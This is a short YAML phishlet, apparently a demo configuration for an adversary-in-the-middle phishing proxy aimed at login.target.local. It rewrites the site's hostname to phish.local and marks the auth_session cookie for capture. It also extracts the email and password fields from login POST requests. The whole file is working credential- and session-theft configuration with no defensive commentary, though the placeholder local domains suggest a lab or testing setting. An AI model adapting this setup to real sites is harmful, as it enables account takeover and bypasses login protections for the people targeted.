name: target-site
author: demo
version: "1"

proxy_hosts:
  - phish_sub: login
    orig_sub:  login
    domain:    target.local
    is_landing: true
    upstream_scheme: http

sub_filters:
  - hostname:   login.target.local
    mime_types: [text/html]
    search:     target\.local
    replace:    phish.local

auth_tokens:
  - domain: ".target.local"
    keys:
      - name: auth_session
        required: true

credentials:
  username:
    key:    "^email$"
    search: "^(.+)$"
    type:   post
  password:
    key:    "^password$"
    search: "^(.+)$"
    type:   post

login:
  domain: login.target.local
  path:   /login
